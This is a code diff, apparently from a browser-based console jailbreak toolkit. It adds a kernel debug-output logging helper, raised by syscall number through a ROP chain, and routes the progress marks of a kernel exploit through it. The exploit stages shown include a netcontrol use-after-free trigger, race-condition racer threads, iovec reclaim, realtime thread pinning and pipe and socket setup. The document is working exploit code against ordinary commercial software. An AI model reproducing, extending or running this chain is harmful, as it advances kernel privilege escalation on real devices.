@@ -3050,6 +3050,12 @@ export const PSYS = {
   DYNLIB_DLSYM: 0x24f,
   IOCTL: 0x36,
   PIPE2: 0x2af,
+  /* sceKernelDebugOutText. libkernel_web 0x00AE00 on 7.00 is three
+     instructions -- `mov rdx,rdi ; mov edi,7 ; jmp <syscall 0x259 stub>` --
+     so the chain raises it BY NUMBER and never touches the module, which also
+     side-steps this console's build shift. Args as the wrapper passes them:
+     (7, text, channel). */
+  DEBUG_OUT_TEXT: 0x259,
 };
 
 export const PK = {
@@ -3492,6 +3498,60 @@ export function makePoopsEngine(X) {
 
   function alloc(nbytes, label) {
     return TW.arena(nbytes, label);
+  }
+
+  /* The devkit console, and the only log channel a WebProcess death cannot
+     erase.
+     -------------------------------------------------------------------------
+     Everything else we have is inside the dying process: the screen repaints at
+     most every 250ms inside a race window, queued marks go with the heap, and
+     the localStorage trail survives but is only readable on the NEXT load. Text
+     handed to syscall 0x259 is in the kernel's hands the moment it returns, and
+     Target Manager already has it.
+     Deliberately NOT wired into flushMark: this launches a ROP chain, the chain
+     is a single shared resource, and firing one from an unawaited mark handler
+     would interleave it with whatever chain is already running. Every call site
+     awaits. */
+  let ttyArena = null,
+    ttySeq = 0,
+    ttyProbed = 0;
+  async function tty(text) {
+    if (P.syscalls[PSYS.DEBUG_OUT_TEXT] === undefined) {
+      if (!ttyProbed) {
+        ttyProbed = 1;
+        flushMark("TTY", "unavailable-no-stub-for-syscall-0x259");
+      }
+      return -1;
+    }
+    if (!ttyArena) ttyArena = alloc(0x140, "tty");
+    const line =
+      "[slopkit " +
+      ++ttySeq +
+      "] " +
+      String(text == null ? "" : text)
+        .replace(/[^ -~]/g, " ")
+        .slice(0, 0x100) +
+      String.fromCharCode(10);
+    const u8 = ttyArena.u8;
+    for (let i = 0; i < line.length; ++i) u8[i] = line.charCodeAt(i) & 0x7f;
+    u8[line.length] = 0;
+    const r = await sys(PSYS.DEBUG_OUT_TEXT, 7, ttyArena.base, 0);
+    if (!ttyProbed) {
+      ttyProbed = 1;
+      flushMark(
+        "TTY",
+        "sceKernelDebugOutText-syscall0x259-ret=" +
+          r.s32 +
+          (r.failed ? "-" + r.errText : "-ok") +
+          "-look-for-[slopkit-N]-in-the-target-console",
+      );
+    }
+    return r.failed ? -1 : r.s32;
+  }
+
+  async function ttyMark(tag, extra) {
+    flushMark(tag, extra);
+    await tty(tag + " " + (extra == null ? "" : extra));
   }
 
   function buildBuffers() {
@@ -4003,7 +4063,7 @@ export function makePoopsEngine(X) {
       b.setBuf.base,
       8,
     );
-    flushMark("NETCTRL-SET", "slot=-1-ret=" + r.s32 + "-" + r.errText);
+    await ttyMark("NETCTRL-SET", "slot=-1-ret=" + r.s32 + "-" + r.errText);
     if (r.failed || r.s32 !== 0) {
       flushMark("NETCTRL-SET-PRE", "slot=1-fallback (poops.c:685-694)");
       r = await sys(
@@ -4013,7 +4073,7 @@ export function makePoopsEngine(X) {
         b.setBuf.base,
         8,
       );
-      flushMark("NETCTRL-SET", "slot=1-ret=" + r.s32 + "-" + r.errText);
+      await ttyMark("NETCTRL-SET", "slot=1-ret=" + r.s32 + "-" + r.errText);
       if (r.failed || r.s32 !== 0) {
         await sys(PSYS.CLOSE, discard);
         untrack(discard);
@@ -4098,7 +4158,7 @@ export function makePoopsEngine(X) {
     S.uafClosed = false;
     S.uafSocks.push(S.uafSock);
     track(S.uafSock);
-    flushMark(
+    await ttyMark(
       "NETCTRL-UAF",
       "uaf_sock=" +
         S.uafSock +
@@ -4127,7 +4187,7 @@ export function makePoopsEngine(X) {
       b.clrBuf.base,
       8,
     );
-    flushMark("NETCTRL-CLEAR", "ret=" + cr.s32 + "-" + cr.errText);
+    await ttyMark("NETCTRL-CLEAR", "ret=" + cr.s32 + "-" + cr.errText);
     return {
       ok: true,
       slot,
@@ -4573,7 +4633,7 @@ export function makePoopsEngine(X) {
        With eight attempts the rows scroll off a twelve-line screen, and the
        failure line quotes only the last attempt -- which, once the netcontrol
        slots are spent, is always the degenerate "could not arm" one. */
-    const finish = (res) => {
+    const finish = async (res) => {
       const order = STEPS.slice();
       let best = "none", bestIdx = -1, reached = 0;
       for (const st of steps) {
@@ -4581,7 +4641,7 @@ export function makePoopsEngine(X) {
         if (i > bestIdx) { bestIdx = i; best = st; }
       }
       for (const st of steps) if (st === best) reached++;
-      flushMark(
+      await ttyMark(
         "STAGE0-STEPS",
         "furthest=" + best +
           "-atStep=" + bestIdx + "-of-" + (order.length - 1) +
@@ -4692,22 +4752,22 @@ export function makePoopsEngine(X) {
          would take down a stage that is otherwise working. */
       const listOf = (v) => (v && typeof v.join === "function"
         ? v.join(".") : v == null ? "none" : String(v));
+      let rowDetail;
       try {
-        flushMark(
-          "STAGE0-ROW",
+        rowDetail =
           "a" + attempt +
-            "-" + report.step +
-            "-twins=" + listOf(report.twins) +
-            "-blk=" + report.blockedAfterSignal + "/" + report.iovRacers +
-            "-recv=" + report.recvmsgRet +
-            "-rec=" + report.reclaimRounds +
-            "-trip=" + listOf(report.tripletAttempts) +
-            "-" + attemptElapsedMs + "ms"
-        );
+          "-" + report.step +
+          "-twins=" + listOf(report.twins) +
+          "-blk=" + report.blockedAfterSignal + "/" + report.iovRacers +
+          "-recv=" + report.recvmsgRet +
+          "-rec=" + report.reclaimRounds +
+          "-trip=" + listOf(report.tripletAttempts) +
+          "-" + attemptElapsedMs + "ms";
       } catch (e) {
-        flushMark("STAGE0-ROW", "a" + attempt + "-" + report.step
-          + "-rowFailed=" + String((e && e.message) || e).slice(0, 60));
+        rowDetail = "a" + attempt + "-" + report.step
+          + "-rowFailed=" + String((e && e.message) || e).slice(0, 60);
       }
+      await ttyMark("STAGE0-ROW", rowDetail);
 
       if (report.ok) {
         flushMark(
@@ -8523,6 +8583,8 @@ export function makePoopsEngine(X) {
     pickBurnCores,
 
     buildBurnWorker,
+    tty,
+    ttyMark,
     RACER_FIELDS,
     crfree,
     triggerNetcontrol,
@@ -8963,6 +9025,10 @@ export function buildLadder(X, E) {
               (lr.detail || "?") +
               "); nothing has been changed yet",
           );
+        await E.ttyMark(
+          "PS1-ENTER",
+          "next=rtprio_thread-PRI_REALTIME/" + TK.POOPS_RTPRIO,
+        );
 
         const pr = await H.writeRtprio(
           TK.PRI_REALTIME,
@@ -8979,7 +9045,7 @@ export function buildLadder(X, E) {
         const pb = await H.readRtprio("driver-check");
         if (pb.type !== TK.PRI_REALTIME || pb.prio !== TK.POOPS_RTPRIO)
           return FAIL("driver rtprio read back " + pb.type + "/" + pb.prio);
-        flushMark("PS1-RTPRIO", "type=" + pb.type + "-prio=" + pb.prio);
+        await E.ttyMark("PS1-RTPRIO", "type=" + pb.type + "-prio=" + pb.prio);
         const pin = await H.pinDriver(driver.core);
         driver.affChanged = true;
         if (pin.failed)
@@ -8998,7 +9064,7 @@ export function buildLadder(X, E) {
               ((1 << driver.core) >>> 0).toString(16),
           );
         driver.pinned = true;
-        flushMark("PS1-PINNED", "core=" + driver.core);
+        await E.ttyMark("PS1-PINNED", "core=" + driver.core);
         note(
           "driver: PRI_REALTIME/256 set and read back, pinned to core " +
             driver.core +
@@ -9006,7 +9072,7 @@ export function buildLadder(X, E) {
         );
 
         E.buildBuffers();
-        flushMark("PS1-BUFFERS", "built");
+        await E.ttyMark("PS1-BUFFERS", "built");
         note(
           "recvmsg iovec array is " +
             PK.MSG_IOV_NUM +
@@ -9027,11 +9093,11 @@ export function buildLadder(X, E) {
         const [ia, ib] = await E.socketpairUnix("iov");
         const [ua, ub] = await E.socketpairUnix("uio");
         E.setSocketpairs(ia, ib, ua, ub);
-        flushMark("PS1-SOCKETPAIRS", "iov=" + ia + "." + ib + "-uio=" + ua + "." + ub);
+        await E.ttyMark("PS1-SOCKETPAIRS", "iov=" + ia + "." + ib + "-uio=" + ua + "." + ub);
         const [mr, mw] = await E.pipe2Nonblock("master");
         const [vr, vw] = await E.pipe2Nonblock("victim");
         E.setPipes(mr, mw, vr, vw);
-        flushMark("PS1-PIPES", "master=" + mr + "." + mw + "-victim=" + vr + "." + vw);
+        await E.ttyMark("PS1-PIPES", "master=" + mr + "." + mw + "-victim=" + vr + "." + vw);
         note(
           "master pipe r=" +
             mr +
@@ -9044,9 +9110,9 @@ export function buildLadder(X, E) {
         );
 
         await E.setupRacerGroups(driver.core);
-        flushMark("PS1-GROUPS", "core=" + driver.core + "-next=spawnRacers");
+        await E.ttyMark("PS1-GROUPS", "core=" + driver.core + "-next=spawnRacers");
         const sp = await E.spawnRacers(driver.core);
-        flushMark("PS1-SPAWNED", sp.map((x) => x.name + "=" + x.live).join("-"));
+        await E.ttyMark("PS1-SPAWNED", sp.map((x) => x.name + "=" + x.live).join("-"));
         note(
           "racers: " +
             sp
